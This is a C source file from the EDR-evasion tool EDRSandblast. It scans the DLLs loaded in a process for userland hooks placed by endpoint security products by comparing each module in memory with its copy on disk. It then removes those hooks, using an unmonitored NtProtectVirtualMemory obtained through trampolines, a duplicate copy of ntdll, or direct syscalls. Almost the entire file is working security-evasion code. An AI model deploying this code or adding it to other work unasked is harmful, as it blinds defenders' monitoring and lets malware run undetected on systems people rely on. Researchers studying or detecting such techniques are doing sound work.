/*
* All the logic that detects, resolves, patch userland hooks and other related structures
*/

#include <Windows.h>
#include <PathCch.h>
#include <stdio.h>

#include "../EDRSandblast.h"
#include "FileUtils.h"
#include "UserlandHooks.h"
#include "PEBBrowse.h"
#include "Undoc.h"
#include "Syscalls.h"


#if _DEBUG
int debugf(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    int res = vprintf(fmt, args);
    va_end(args);
    return res;
}
#else
#define debugf(...)
#endif

/*
* Return the address (in "mem") of the first difference between two memory ranges ("mem" & "disk") of size "len".
* If the "lenPatch" pointer is provided, also returns the number of consecutive bytes that differ
*/
PBYTE findDiff(PBYTE mem, PBYTE disk, size_t len, size_t* lenPatch) {
    for (size_t i = 0; i < len; i++) {
        if (mem[i] != disk[i]) {
            size_t patchStartIndex = i;
            if (NULL != lenPatch) {
                while (mem[i] != disk[i] && i < len) {
                    i++;
                }
                *lenPatch = i - patchStartIndex;
            }
            return &mem[patchStartIndex];
        }
    }
    if (NULL != lenPatch) {
        *lenPatch = 0;
    }
    return NULL;
}

/*
* Returns a list of differences (patches) between two memory ranges ("searchStartMem" and "searchStartDisk") of size "sizeToScan".
* The list is a NULL-terminated array of "diff" elements
*/
PATCH_DIFF* findDiffsInRange(PBYTE searchStartMem, PBYTE searchStartDisk, size_t sizeToScan) {
    size_t diffSize;
    PVOID diffAddr = findDiff(searchStartMem, searchStartDisk, sizeToScan, &diffSize);
    DWORD diffsListLen = 4;
    size_t diffsListI = 0;
    PATCH_DIFF* diffsList = malloc(diffsListLen * sizeof(PATCH_DIFF));
    if (NULL == diffsList) {
        debugf("bug in malloc in findDiffsInRange\n");
        exit(1);
    }

    while (diffAddr != NULL && sizeToScan != 0) {
        //debugf("diff found at 0x%p of size %d\n", diffAddr, diffSize);
        searchStartDisk = (BYTE*)searchStartDisk + ((BYTE*)diffAddr + diffSize - (BYTE*)searchStartMem);
        sizeToScan -= ((BYTE*)diffAddr + diffSize - (BYTE*)searchStartMem);
        searchStartMem = (BYTE*)diffAddr + diffSize;
        diffsList[diffsListI].mem_ptr = diffAddr;
        diffsList[diffsListI].disk_ptr = searchStartDisk - diffSize;
        diffsList[diffsListI].size = diffSize;
        diffAddr = findDiff(searchStartMem, searchStartDisk, sizeToScan, &diffSize);
        diffsListI++;
        if (diffsListI >= diffsListLen) {
            diffsListLen *= 2;
            PVOID diffsListTmp = realloc(diffsList, diffsListLen * sizeof(PATCH_DIFF));
            if (NULL == diffsListTmp) {
                debugf("bug in realloc in findDiffsInRange\n");
                exit(1);
            }
            diffsList = diffsListTmp;
        }
    }

    PVOID diffsListTmp = realloc(diffsList, (diffsListI + 1) * sizeof(PATCH_DIFF));
    if (NULL == diffsListTmp) {
        debugf("bug in realloc in findDiffsInRange\n");
        exit(1);
    }
    diffsList = diffsListTmp;
    diffsList[diffsListI].mem_ptr = NULL;
    diffsList[diffsListI].disk_ptr = NULL;
    diffsList[diffsListI].size = 0;
    return diffsList;
}

/*
* Returns the list of differences between the content of a PE on disk and the content of its version in memory.
* Only read-only sections are compared, since writable sections will obviously contain differences.
* Warning : "diskPe" should have been "relocated" to the same address as "memPe" in order not to return all relocations as differences
*/
PATCH_DIFF* findDiffsInNonWritableSections(PE* memPe, PE* diskPe) {
    PATCH_DIFF* list = NULL;
    for (IMAGE_SECTION_HEADER* nonWritableSection = PE_nextSectionHeader_fromPermissions(memPe, NULL, 0, -1, 0);
        nonWritableSection != NULL;
        nonWritableSection = PE_nextSectionHeader_fromPermissions(memPe, nonWritableSection, 0, -1, 0)) {
        debugf("Diffs in section %s:\n", nonWritableSection->Name);
        DWORD sectionRVA = nonWritableSection->VirtualAddress;
        LPVOID sectionAddrDisk = PE_RVA_to_Addr(diskPe, sectionRVA);
        LPVOID sectionAddrMem = PE_RVA_to_Addr(memPe, sectionRVA);
        LPVOID searchStartMem = sectionAddrMem;
        LPVOID searchStartDisk = sectionAddrDisk;
        DWORD remainingSize = nonWritableSection->Misc.VirtualSize;

        list = findDiffsInRange(searchStartMem, searchStartDisk, remainingSize);
    }
    return list;
}



/*
* Looks for a memory needle in a memory haystack
*/
PBYTE memmem(PVOID haystack, SIZE_T haystack_len, PVOID needle, SIZE_T needle_len)
{
    if (!haystack)
        return NULL;
    if (!haystack_len)
        return NULL;
    if (!needle)
        return NULL;
    if (!needle_len)
        return NULL;
    PBYTE h = haystack;
    while (haystack_len >= needle_len)
    {
        if (!memcmp(h, needle, needle_len))
            return h;
        ++h;
        --haystack_len;
    }
    return NULL;
}

/*
* Search for a piece of executable code starting with pattern followed by a jump to expectedTarget
*/
PVOID searchTrampolineInExecutableMemory(PVOID pattern, size_t patternSize, PVOID expectedTarget)
{
    SIZE_T haystack_len;
    PVOID haystack;
    PBYTE patternInExecutableMemory;
    MEMORY_BASIC_INFORMATION mbi = { 0 };

    for (PBYTE addr = 0; ; addr += mbi.RegionSize)
    {
        if (!VirtualQuery(addr, &mbi, sizeof(mbi))) {
            break;
        }

        if (mbi.State != MEM_COMMIT) {
            continue;
        }
        if (mbi.Protect != PAGE_EXECUTE && mbi.Protect != PAGE_EXECUTE_READ && mbi.Protect != PAGE_EXECUTE_READWRITE) {
            continue;
        }
        haystack = mbi.BaseAddress;
        haystack_len = mbi.RegionSize;
        while (haystack_len)
        {
            patternInExecutableMemory = (PBYTE)memmem(haystack, haystack_len, pattern, patternSize);
            if (!patternInExecutableMemory) {
                break;
            }
            if (hookResolver(&patternInExecutableMemory[patternSize]) == expectedTarget) {
                return patternInExecutableMemory;
            }
            haystack_len -= patternInExecutableMemory + 1 - (PBYTE)haystack;
            haystack = patternInExecutableMemory + 1;
        }
    }
    return NULL;
}


VOID unhook(HOOK* hook, UNHOOK_METHOD unhook_method) {
    if (unhook_method == UNHOOK_NONE) {
        return;
    }

    const WCHAR* ntdlolFileName = L".\\ntdlol.txt";
    WCHAR ntdllFilePath[MAX_PATH] = { 0 };
    WCHAR ntdlolFilePath[MAX_PATH] = { 0 };
    HANDLE secondNtdll = INVALID_HANDLE_VALUE;
    PE* ntdll_mem = NULL;
    PE* ntdll_disk = NULL;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);

    PATCH_DIFF* patches = hook->list_patches;
    //merge every small patches into 1 patch to perform a single write
    PATCH_DIFF patch = patches[0];
    int nb_patches = 0;
    while (patches[nb_patches].size) {
        nb_patches++;
    }
    PATCH_DIFF lastPatch = patches[nb_patches - 1];
    patch.size += ((PBYTE)(lastPatch.mem_ptr) - ((PBYTE)(patch.mem_ptr) + patch.size)) + lastPatch.size;

    pNtProtectVirtualMemory unmonitoredNtProtectVirtualMemory = NULL;

    // Method used to get a NtProtectVirtualMemory function that is safe to use
    switch (unhook_method) {
    case UNHOOK_WITH_NTPROTECTVIRTUALMEMORY:
        // in this case, it is not really "safe" to use
        unmonitoredNtProtectVirtualMemory = (pNtProtectVirtualMemory)PE_functionAddr(ntdll_mem, "NtProtectVirtualMemory");
        break;

    case UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE:
    case UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE:
        unmonitoredNtProtectVirtualMemory = getSafeVirtualProtectUsingTrampoline(unhook_method);
        break;

    case UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY:
        GetSystemDirectoryW(ntdllFilePath, _countof(ntdllFilePath));
        PathCchCombine(ntdllFilePath, _countof(ntdllFilePath), ntdllFilePath, L"ntdll.dll");

        GetTempPathW(MAX_PATH, ntdlolFilePath);
        PathCchCombine(ntdlolFilePath, _countof(ntdlolFilePath), ntdlolFilePath, ntdlolFileName);

        CopyFileW(ntdllFilePath, ntdlolFilePath, FALSE);
        secondNtdll = LoadLibraryW(ntdlolFilePath);
        PE* secondNtdll_pe = PE_create(secondNtdll, TRUE);

        unmonitoredNtProtectVirtualMemory = (pNtProtectVirtualMemory)PE_functionAddr(secondNtdll_pe, "NtProtectVirtualMemory");
        break;
    case UNHOOK_WITH_DIRECT_SYSCALL:
        unmonitoredNtProtectVirtualMemory = (pNtProtectVirtualMemory)CreateSyscallStubWithVirtuallAlloc("NtProtectVirtualMemory");
        if (unmonitoredNtProtectVirtualMemory == NULL) {
            printf_or_not("Something wrong happened with CreateSyscallStubWithVirtuallAlloc, aborting...\n");
            exit(EXIT_FAILURE);
        }
        break;
    default:
        printf_or_not("Unhook method does not exist, exiting...\n");
        exit(EXIT_FAILURE);
        break;
    }

    //actually remove the hook
    DWORD oldProtect;
    PVOID patch_mem_ptr = patch.mem_ptr;
    SIZE_T patch_size = patch.size;
    NTSTATUS status = unmonitoredNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &patch_mem_ptr,
        &patch_size,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        debugf("unmonitoredNtProtectVirtualMemory 1 failed with status 0x%08x\n", status);
        exit(1);
    }

    for (size_t i = 0; i < patch.size; i++) {
        ((PBYTE)patch.mem_ptr)[i] = ((PBYTE)patch.disk_ptr)[i];
    }

    status = unmonitoredNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &patch_mem_ptr,
        &patch_size,
        oldProtect,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        debugf("unmonitoredNtProtectVirtualMemory 2 failed with status 0x%08x\n", status);
        exit(1);
    }

    switch (unhook_method) {
    case UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY:
        if (secondNtdll && INVALID_HANDLE_VALUE != secondNtdll) {
            FreeLibrary(secondNtdll);
        }
        DeleteFileW(ntdlolFilePath);
        break;

    }
}



pNtProtectVirtualMemory getSafeVirtualProtectUsingTrampoline(DWORD unhook_method) {
    PE* ntdllPE_mem = NULL;
    PE* ntdllPE_disk = NULL;
    getNtdllPEs(&ntdllPE_mem, &ntdllPE_disk);

    PVOID disk_NtProtectVirtualMemory = PE_functionAddr(ntdllPE_disk, "NtProtectVirtualMemory");
    PVOID mem_NtProtectVirtualMemory = PE_functionAddr(ntdllPE_mem, "NtProtectVirtualMemory");

    size_t patchSize = 0;
    PVOID patchAddr = findDiff(mem_NtProtectVirtualMemory, disk_NtProtectVirtualMemory, PATCH_MAX_SIZE, &patchSize);

    if (patchSize == 0) {
        return (pNtProtectVirtualMemory)mem_NtProtectVirtualMemory;
    }

    if (unhook_method == UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE) {
        PVOID trampoline = NULL;
        trampoline = searchTrampolineInExecutableMemory((PBYTE)disk_NtProtectVirtualMemory + ((PBYTE)patchAddr - (PBYTE)mem_NtProtectVirtualMemory), patchSize, (PBYTE)patchAddr + patchSize);
        if (NULL == trampoline) {
            debugf("Trampoline for NtProtectVirtualMemory was impossible to find !\n");
            exit(1);
        }
        return (pNtProtectVirtualMemory)trampoline;
    }
    else if (unhook_method == UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE) {

#if _WIN64
#define JUMP_SIZE 14
#else
#define JUMP_SIZE 5
#endif
        PBYTE trampoline = VirtualAlloc(NULL, patchSize + JUMP_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NULL == trampoline) {
            debugf("\tError : VirtualAlloc: 0x%x\n\n", GetLastError());
            exit(1);
        }

        DWORD oldProtect;
        memcpy(trampoline, disk_NtProtectVirtualMemory, patchSize);
#if _WIN64
        * ((WORD*)(trampoline + patchSize)) = 0x25FF; //RIP relative jmp
        *((DWORD*)(trampoline + patchSize + 2)) = 0x0; // [RIP + 0]
        *((QWORD*)(trampoline + patchSize + 2 + 4)) = (QWORD)(((BYTE*)mem_NtProtectVirtualMemory) + patchSize);
#else
        * (trampoline + patchSize) = 0xE9; //far JMP
        *((DWORD*)(trampoline + patchSize + 1)) = (DWORD)(((DWORD)mem_NtProtectVirtualMemory) + patchSize - (((DWORD)trampoline) + patchSize + JUMP_SIZE));
#endif
        VirtualProtect(trampoline, patchSize + JUMP_SIZE, PAGE_EXECUTE_READ, &oldProtect);

        return (pNtProtectVirtualMemory)trampoline;
    }
    return NULL;
}

PVOID hookResolver(PBYTE hookAddr) {
    PBYTE destination = hookAddr;
    BOOL hasFollowedJmp = FALSE;
    while (TRUE) {
        MEMORY_BASIC_INFORMATION mbi;
        VirtualQuery(destination, &mbi, sizeof(mbi));
        if (mbi.State != MEM_COMMIT) {
            return NULL;
        }
        switch (destination[0]) {
        case 0xE9:
        {
            int diff = *((int*)(&destination[1]));
            destination = &destination[5] + diff;
            hasFollowedJmp = TRUE;
            break;
        }
#if _WIN64
        case 0xFF:
        {
            BYTE selector = destination[1];
            if (selector != 0x25) {
                return NULL;
            }
            int diff = *((int*)(&destination[2]));
            QWORD* offsetPtr = (QWORD*)((&destination[6]) + diff);
            destination = (PBYTE)*offsetPtr;
            hasFollowedJmp = TRUE;
            break;
        }
#endif
        default:
            if (!hasFollowedJmp) {
                return NULL;
            }
            else {
                return destination;
            }
        }
    }
}

BOOL isFunctionHooked(LPCSTR functionName, PE* memDLL, PE* diskDLL) {
    PVOID mem_functionStart = PE_functionAddr(memDLL, functionName);
    PVOID disk_functionStart = PE_functionAddr(diskDLL, functionName);
    return findDiff(mem_functionStart, disk_functionStart, PATCH_MAX_SIZE, NULL) != NULL;
}

_Ret_notnull_ HOOK* searchHooks(const char* csvFileName) {
    FILE* csvFile = NULL;
    DWORD hookListSize = 8;
    DWORD hookList_i = 0;
    HOOK* hooksList = calloc(hookListSize, sizeof(HOOK));
    if (NULL == hooksList) {
        debugf("calloc failed\n");
        exit(1);
    }
    if (csvFileName) {
        if (fopen_s(&csvFile, csvFileName, "w") || NULL == csvFile) {
            perror("CSV file could not be opened:");
            exit(1);
        }
        fprintf(csvFile, "DLL base address;DLL name;DLL full path;Hooked function;Hook handler address;Hook handler relative address\n");
    }

    BOOL hooksFoundInLastModule = TRUE;
    PBYTE disk_dllContent = NULL;
    PE* diskDLL = NULL;
    PE* memDLL = NULL;
    for (LDR_DATA_TABLE_ENTRY* currentModuleEntry = getNextModuleEntryInLoadOrder(NULL); currentModuleEntry != NULL; currentModuleEntry = getNextModuleEntryInLoadOrder(currentModuleEntry)) {
        UNICODE_STRING dll_name = currentModuleEntry->BaseDllName;
        if (dll_name.Buffer == NULL) {
            continue;
        }
        WCHAR* moduleName = currentModuleEntry->FullDllName.Buffer;

        if (!hooksFoundInLastModule) {
            printf_or_not("[+] [Hooks]\t\tNo hooks found in this module.\n");
            if (disk_dllContent) {
                free(disk_dllContent);
                disk_dllContent = NULL;
            }
            if (memDLL) {
                PE_destroy(memDLL);
                memDLL = NULL;
            }
            if (diskDLL) {
                PE_destroy(diskDLL);
                diskDLL = NULL;
            }
        }
        else {
            hooksFoundInLastModule = FALSE;
        }
        printf_or_not("[+] [Hooks]\t%ws (%ws): 0x%p\n", dll_name.Buffer, moduleName, currentModuleEntry->DllBase);
        if (csvFile) {
            fprintf(csvFile, "0x%p;%ws;%ws;;;\n",
                currentModuleEntry->DllBase,
                currentModuleEntry->BaseDllName.Buffer,
                currentModuleEntry->FullDllName.Buffer
            );
        }

        PVOID mem_dllImageBase = currentModuleEntry->DllBase;
        memDLL = PE_create(mem_dllImageBase, TRUE);
        if (!memDLL || NULL == memDLL->exportDirectory) {
            continue;
        }

        if (!FileExistsW(currentModuleEntry->FullDllName.Buffer)) {
            continue;
        }
        disk_dllContent = ReadFullFileW(currentModuleEntry->FullDllName.Buffer);
        if (NULL == disk_dllContent) {
            debugf("\tError : ReadFullFileW: 0x%x\n\n", GetLastError());
            continue;
        }


        diskDLL = PE_create(disk_dllContent, FALSE);
        if (NULL == diskDLL) {
            debugf("\tError : PE_create\n");
            continue;
        }

        PE_rebasePE(diskDLL, memDLL->baseAddress);

        for (DWORD nameOrdinal = 0; nameOrdinal < diskDLL->exportedNamesLength; nameOrdinal++) {
            LPCSTR functionName = PE_RVA_to_Addr(diskDLL, diskDLL->exportedNames[nameOrdinal]);
            DWORD functionRVA = PE_functionRVA(diskDLL, functionName);
            IMAGE_SECTION_HEADER* functionSectionHeader = PE_sectionHeader_fromRVA(diskDLL, functionRVA);

            if ((functionSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)//not a function
                continue;

            PBYTE disk_functionStart = PE_functionAddr(diskDLL, functionName);
            PBYTE mem_functionStart = PE_functionAddr(memDLL, functionName);

            //check if hook was already detected in this function (due to export aliasing)
            BOOL alreadyChecked = FALSE;
            for (size_t i = 0; i < hookList_i; i++) {
                if (hooksList[i].mem_function == mem_functionStart) {
                    alreadyChecked = TRUE;
                    break;
                }

            }
            if (alreadyChecked)
                continue;

            if (isFunctionHooked(functionName, diskDLL, memDLL)) {
                printf_or_not("[+] [Hooks]\t\tHook detected in function %s (0x%08lx)", functionName, functionRVA);
                hooksFoundInLastModule = TRUE;
                PVOID jmpTarget = hookResolver(mem_functionStart);
                if (NULL == jmpTarget) {
                    printf_or_not("...but not a JMP, maybe a false positive (data export) or unimplemented hook recognition\n");
                }
                else {
                    LDR_DATA_TABLE_ENTRY* hookTargetModuleEntry = getModuleEntryFromAbsoluteAddr(jmpTarget);
                    for (DWORD i = 0; i < 40 - strlen(functionName); i++) {
                        printf_or_not(" ");
                    }
                    // TODO: Fix hooks resolver to identify dll 
                    // printf_or_not("-> %ws+0x%tx", hookTargetModuleEntry->BaseDllName.Buffer, ((PBYTE)jmpTarget) - ((PBYTE)hookTargetModuleEntry->DllBase));

                    if (csvFile) {
                        fprintf(csvFile, "0x%p;%ws;%ws;%s;0x%p;%ws+0x%tx\n",
                            currentModuleEntry->DllBase,
                            currentModuleEntry->BaseDllName.Buffer,
                            currentModuleEntry->FullDllName.Buffer,
                            functionName,
                            jmpTarget,
                            hookTargetModuleEntry->BaseDllName.Buffer, ((PBYTE)jmpTarget) - ((PBYTE)hookTargetModuleEntry->DllBase)
                        );
                    }

                    if (hookList_i >= hookListSize) {
                        hookListSize *= 2;
                        PVOID hooksListTmp = realloc(hooksList, hookListSize * sizeof(HOOK));
                        if (hooksListTmp == NULL) {
                            debugf("realloc failed\n");
                            exit(1);
                        }
                        hooksList = hooksListTmp;
                    }
                    printf_or_not("\n");

                    hooksList[hookList_i].mem_function = mem_functionStart;
                    hooksList[hookList_i].disk_function = disk_functionStart;
                    hooksList[hookList_i].functionName = functionName;
                    hooksList[hookList_i].list_patches = findDiffsInRange(mem_functionStart, disk_functionStart, PATCH_MAX_SIZE);
                    hookList_i++;
                }
            }
        }
    }
    if (!hooksFoundInLastModule) {
        printf_or_not("[+] [Hooks]\t\tNo hooks found in this module.\n");
    }
    if (csvFileName) {
        fclose(csvFile);
    }
    if (hookList_i >= hookListSize) {
        hookListSize++;
        PVOID hooksListTmp = realloc(hooksList, hookListSize * sizeof(HOOK));
        if (NULL == hooksListTmp) {
            printf_or_not("realloc failed\n");
            exit(1);
        }
        hooksList = hooksListTmp;
    }
    hooksList[hookList_i].mem_function = NULL;
    hooksList[hookList_i].disk_function = NULL;
    hooksList[hookList_i].functionName = NULL;

    return hooksList;
}

/*
* Get a view of ntdll.dll PE both on disk and in memory, while caching it for later access
* "Rebase" the disk version to the same base address of the memory-mapped one for coherence
*/
void getNtdllPEs(PE** ntdllPE_mem, PE** ntdllPE_disk) {
    LDR_DATA_TABLE_ENTRY* ntdllModuleEntry = getModuleEntryFromNameW(L"ntdll.dll");
    PE* ntdllPE_mem_l = NULL;
    PE* ntdllPE_disk_l = NULL;

    if (ntdllMemPe_g == NULL) {
        ntdllMemPe_g = ntdllPE_mem_l = PE_create(ntdllModuleEntry->DllBase, TRUE);
    }
    else {
        ntdllPE_mem_l = ntdllMemPe_g;
    }
    if (ntdllDiskPe_g == NULL) {
        PVOID disk_dllContent = ReadFullFileW(ntdllModuleEntry->FullDllName.Buffer);
        if (NULL == disk_dllContent) {
            exit(1);
        }
        ntdllDiskPe_g = ntdllPE_disk_l = PE_create(disk_dllContent, FALSE);
        PE_rebasePE(ntdllPE_disk_l, ntdllPE_mem_l->baseAddress);
    }
    else {
        ntdllPE_disk_l = ntdllDiskPe_g;
    }

    if (ntdllPE_mem) {
        *ntdllPE_mem = ntdllPE_mem_l;
    }
    if (ntdllPE_disk) {
        *ntdllPE_disk = ntdllPE_disk_l;
    }
}

void test_trampoline_search()
{
    for (HOOK* h = searchHooks(NULL); h->disk_function; ++h)
    {
        PVOID trampoline = NULL;
        printf_or_not("[+] [Hooks]\tLooking for %s trampoline...\n", h->functionName);
        for (PATCH_DIFF* d = h->list_patches; d->disk_ptr; ++d)
        {
            trampoline = (PBYTE)searchTrampolineInExecutableMemory((PBYTE)d->disk_ptr, d->size, (PBYTE)d->mem_ptr + d->size);
            if (trampoline)
            {
                printf_or_not("[+] [Hooks]\t\tTrampoline found at %p !\n", trampoline);
                break;
            }
        }
        if (!trampoline)
            printf_or_not("[+] [Hooks]\t\tTRAMPOLINE NOT FOUND !\n");
    }
}
